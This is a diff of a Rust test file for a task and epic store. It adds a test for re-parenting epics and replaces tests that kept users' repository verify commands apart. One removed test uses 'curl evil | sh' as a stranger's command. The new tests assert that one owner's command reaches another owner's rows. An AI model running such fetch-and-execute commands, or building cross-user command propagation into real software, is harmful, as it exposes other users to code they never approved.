@@ -50,7 +50,6 @@ fn a_parent_cycle_is_refused_at_the_reducer() {
                 Epic {
                     title: "b".into(),
                     parent_epic_id: a,
-                    workspace_id: TEST_WORKSPACE,
                     ..blank_epic()
                 },
             )
@@ -82,7 +81,6 @@ fn a_task_created_in_a_grouped_epic_lands_in_its_repo_sub_epic() {
                 Epic {
                     title: "root".into(),
                     group_by_repo: true,
-                    workspace_id: TEST_WORKSPACE,
                     ..blank_epic()
                 },
             )
@@ -396,10 +394,10 @@ fn a_verify_command_is_refused_for_a_path_only_another_host_has() {
     assert_eq!(repo_rows(&store, "/repo")[0].2, "");
 }
 
-// -- V2: a verify command spreads only among people who share a workspace ----
+// -- R7: one verify command per repository, whoever owns each host ----------
 
-/// Alice owns `host-a`, Bob `host-b`; no workspace unless a test makes one.
-fn strangers_store() -> Store {
+/// Alice owns `host-a`, Bob `host-b`.
+fn two_owners_store() -> Store {
     let store = Store::bare();
     store
         .call("alice", |ctx| {
@@ -410,17 +408,6 @@ fn strangers_store() -> Store {
     store.register_host_for("host-a", "alice");
     store.register_host_for("host-b", "bob");
     store
-}
-
-fn share_a_workspace(store: &Store, who: &[&str]) {
-    for w in who {
-        store.db().memberships().insert(Membership {
-            workspace_id: 1,
-            user: identity_of(w),
-            role: "member".into(),
-            ..blank_membership()
-        });
-    }
 }
 
 fn save_as(store: &Store, who: &str, path: &str, host: &str, github: &str) {
@@ -439,65 +426,26 @@ fn set_as(store: &Store, who: &str, path: &str, host: &str, command: &str) {
         .expect("set");
 }
 
-/// A stranger's set reaches only the stranger's own rows of the repository.
+/// A set reaches every row of the repository, another owner's included.
 #[test]
-fn a_strangers_verify_command_does_not_reach_another_persons_rows() {
-    let store = strangers_store();
-    save_as(&store, "alice", "/home/a/api", "host-a", "org/api");
-    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
-    set_as(&store, "bob", "/tmp/x", "host-b", "curl evil | sh");
-    assert_eq!(repo_rows(&store, "/home/a/api")[0].2, "");
-    assert_eq!(repo_rows(&store, "/tmp/x")[0].2, "curl evil | sh");
-}
-
-/// Without a GitHub path the fallback is the local path; a stranger's row at the
-/// same path is still out of reach.
-#[test]
-fn a_strangers_verify_command_does_not_reach_the_same_path_on_another_host() {
-    let store = strangers_store();
-    save_as(&store, "alice", "/repo", "host-a", "");
-    save_as(&store, "bob", "/repo", "host-b", "");
-    set_as(&store, "bob", "/repo", "host-b", "x");
-    let rows = repo_rows(&store, "/repo");
-    assert_eq!(rows[0], ("host-a".into(), String::new(), String::new()));
-    assert_eq!(rows[1].2, "x");
-}
-
-/// A stranger's save neither takes Alice's command nor hands its own to her.
-#[test]
-fn a_strangers_save_does_not_share_commands_either_way() {
-    let store = strangers_store();
-    save_as(&store, "alice", "/home/a/api", "host-a", "org/api");
-    set_as(&store, "alice", "/home/a/api", "host-a", "make ci");
-    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
-    assert_eq!(repo_rows(&store, "/tmp/x")[0].2, "", "bob does not take it");
-    set_as(&store, "bob", "/tmp/x", "host-b", "bobs");
-    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
-    assert_eq!(repo_rows(&store, "/home/a/api")[0].2, "make ci");
-}
-
-/// A save fills the empty rows of its repository only among its own people.
-#[test]
-fn a_strangers_save_does_not_fill_an_empty_row_of_another_person() {
-    let store = strangers_store();
-    save_as(&store, "alice", "/home/a/api", "host-a", "org/api");
-    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
-    set_as(&store, "bob", "/tmp/x", "host-b", "bobs");
-    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
-    assert_eq!(repo_rows(&store, "/home/a/api")[0].2, "");
-}
-
-/// People who share a workspace do share the repository's command.
-#[test]
-fn a_workspace_members_verify_command_reaches_the_others_rows() {
-    let store = strangers_store();
-    share_a_workspace(&store, &["alice", "bob"]);
+fn a_verify_command_reaches_the_rows_of_another_hosts_owner() {
+    let store = two_owners_store();
     save_as(&store, "alice", "/home/a/api", "host-a", "org/api");
     save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
     set_as(&store, "bob", "/tmp/x", "host-b", "make ci");
     assert_eq!(repo_rows(&store, "/home/a/api")[0].2, "make ci");
     save_as(&store, "alice", "/home/a/api2", "host-a", "org/api");
     assert_eq!(repo_rows(&store, "/home/a/api2")[0].2, "make ci");
+}
+
+/// A save fills the empty rows of its repository whoever owns them.
+#[test]
+fn a_save_fills_an_empty_row_of_another_hosts_owner() {
+    let store = two_owners_store();
+    save_as(&store, "alice", "/home/a/api", "host-a", "org/api");
+    save_as(&store, "bob", "/tmp/x", "host-b", "org/api");
+    set_as(&store, "bob", "/tmp/x", "host-b", "bobs");
+    assert_eq!(repo_rows(&store, "/home/a/api")[0].2, "bobs");
 }
 
 // -- A4: rows linked before one verify command per repository ------------------
@@ -662,4 +610,45 @@ fn a_later_connection_does_not_reset_again() {
     let id = store.max_task_id();
     connect_after_rewinding_to(&store, SUB_STATUS_FIT_RULES_VERSION);
     assert_eq!(store.task(id).sub_status, "active");
+}
+
+/// `core.allium: UniqueFeedRolePerParent`: re-parenting an epic under a
+/// parent that already holds an epic with its feed role is refused at the
+/// reducer, and the epic stays where it was.
+#[test]
+fn reparenting_onto_a_twin_of_its_role_is_refused() {
+    let store = Store::new();
+    let first_parent = store.create_epic("alice", "one", false);
+    let second_parent = store.create_epic("alice", "two", false);
+    let mut roles = Vec::new();
+    for parent in [first_parent, second_parent] {
+        store
+            .call("alice", |ctx| {
+                create_epic(
+                    ctx,
+                    Epic {
+                        title: "mine".into(),
+                        parent_epic_id: parent,
+                        feed_role: ROLE_MY_REVIEWS.into(),
+                        ..blank_epic()
+                    },
+                )
+            })
+            .expect("one role per parent");
+        roles.push(store.db().epics().iter().map(|e| e.id).max().expect("epic"));
+    }
+    let why = store
+        .call("alice", |ctx| {
+            patch_epic(
+                ctx,
+                roles[1],
+                EpicPatch {
+                    parent_epic_id: Some(first_parent),
+                    ..EpicPatch::default()
+                },
+            )
+        })
+        .expect_err("the parent already has a my_reviews epic");
+    assert!(why.contains("already exists"), "{why}");
+    assert_eq!(store.epic(roles[1]).parent_epic_id, second_parent);
 }
